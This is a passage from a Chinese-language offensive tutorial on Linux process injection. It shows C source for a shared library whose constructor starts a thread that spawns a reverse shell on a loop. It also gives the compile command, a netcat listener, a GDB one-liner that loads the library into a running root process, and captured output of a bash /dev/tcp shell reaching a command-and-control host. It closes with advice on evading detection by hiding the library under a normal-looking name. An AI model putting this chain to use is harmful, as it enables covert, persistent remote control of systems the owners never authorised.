                                    PTHREAD_CREATE_DETACHED)) {
                    return;
            }
            /* Spawn a thread to do the real work */
            pthread_create(&tid, &attr, callback, NULL);
    }
    /* callback tries to spawn a reverse shell every so often.  */
    void *
    callback(void *a)
    {
            for (;;) {
                    /* Try to spawn a reverse shell */
                    system(CMD);
                    /* Wait until next shell */
                    sleep(SLEEP);
            }
            return NULL;
    }
简而言之，这样一来，每隔几分钟便会生成一个未加密的、未经身份验证的反向shell，并连接到硬编码的地址和端口。将 **attribute**
((constructor))
应用于start_callbacks()后，它就可以在加载该程序库时运行了。所有start_callbacks()都会生成一个线程，以创建反向shell。
程序库与普通C程序的编译过程类似，只是必须给编译器提供-fPIC和-shared选项。
    cc -O2 -fPIC -o libcallback.so ./callback.c -lpthread -shared
我们可以用-O2选项来优化输出，这样可以降低CPU时间的开销。当然，在现实情况中，注入的程序库肯定会比这个例子要复杂得多。
**完成注入**
现在，我们已经创建了可注入的程序库，接下来还有许多事情需要处理。首先要做的就是启动一个监听器来捕获回调：
    nc -nvl 4444 #OpenBSD netcat ftw!
____libc_dlopen_mode需要两个参数，即程序库的路径和标志（实际上就是一个整数）。其中，程序库的路径是可见的，所以最好把它放到不显眼的地方，比如/
usr/lib。此外，这里将使用整数2作为标志，因为这正好对应于dlopen(3)的RTLD_NOW。为了使GDB让这个进程运行该函数，可以使用GDB的print命令，以方便取函数的返回值。此外，不要将该命令输入GDB，因为这样太费时间，相反，我们可以将它回显到GDB的标准输入中。这样做的另一个好处是，它会引起GDB退出，这样就省得使用quit命令了。
    root@ubuntu-s-1vcpu-1gb-nyc1-01:~# echo 'print __libc_dlopen_mode("/root/libcallback.so", 2)' | gdb -p 664
    GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
    Copyright (C) 2016 Free Software Foundation, Inc.
    ...snip...
    0x00007f6ca1cf75d3 in select () at ../sysdeps/unix/syscall-template.S:84
    84      ../sysdeps/unix/syscall-template.S: No such file or directory.
    (gdb) [New Thread 0x7f6c9bfff700 (LWP 1590)]
    $1 = 312536496
    (gdb) quit
    A debugging session is active.
            Inferior 1 [process 664] will be detached.
    Quit anyway? (y or n) [answered Y; input not from terminal]
    Detaching from program: /sbin/lvmetad, process 664
检查netcat时，发现已经捕获到了回调：
    [stuart@c2server:/home/stuart]
    $ nc -nvl 4444
    Connection from  50184 received!
    ps -fxo pid,user,args
    ...snip...
      664 root     /sbin/lvmetad -f
     1591 root      \_ sh -c echo 'exec >&/dev/tcp//4444; exec 0>&1' | /bin/bash
     1593 root          \_ /bin/bash
     1620 root              \_ ps -fxo pid,user,args
    ...snip...
很好，我们已经控制了另一个进程的执行流了。
如果注入失败，我们将看到$1 = 0，这说明__libc_dlopen_mode的返回值为NULL。
**攻击踪迹**
实际上，防御方可以从多个地方检测到这种攻击。就算我们将暴露的风险降到最低，但如果没有Rootkit的帮助的话，总是会露出一点尾巴的。当然，最好的隐蔽方式就是不要引起人们的怀疑。
**进程清单**
通过查看之前进程列表，读者会发现被注入恶意软件的进程还有一些子进程。为了避免这种情况，要么让程序库doule-fork出一个子进程来完成实际的工作，要么让注入的程序库完成受害进程内的所有任务。
**磁盘文件**
加载的程序库必须从磁盘上启动，这不仅会在磁盘上留下攻击痕迹，同时，程序库的原始路径也将暴露在/proc/pid/maps中：
    root@ubuntu-s-1vcpu-1gb-nyc1-01:~# cat /proc/664/maps                                                      
    ...snip...
    7f6ca0650000-7f6ca0651000 r-xp 00000000 fd:01 61077    /root/libcallback.so                        
    7f6ca0651000-7f6ca0850000 ---p 00001000 fd:01 61077    /root/libcallback.so                        
    7f6ca0850000-7f6ca0851000 r--p 00000000 fd:01 61077    /root/libcallback.so
    7f6ca0851000-7f6ca0852000 rw-p 00001000 fd:01 61077    /root/libcallback.so            
    ...snip...
如果删除了这个库，字符串(deleted)就会被添加到文件名尾部（即/root/libcallback.so
(deleted)），当然，这看起来确实有点怪异。不过，通过将该程序库存放到常见程序库（如/usr/lib）所在的目录，并将其名称改得正规一点的话，情况就会有所好转。
**服务中断**
加载程序库会不仅会暂停正在运行的进程，并且如果程序库引发进程不稳定的话，还可能会导致进程崩溃，至少会导致系统记录相应的警告消息（所以，请勿注入systemd(1)进程，因为这会引发段错误，进而导致shutdown(8)，将机器挂起）。
**小结**
在Linux系统中完成进程注入其实非常简单，只需两步：
  * 用构造函数编写一个程序库（共享对象文件）。
  * 用echo 'print __libc_dlopen_mode("/path/to/library.so", 2)' | gdb -p 命令加载该程序库。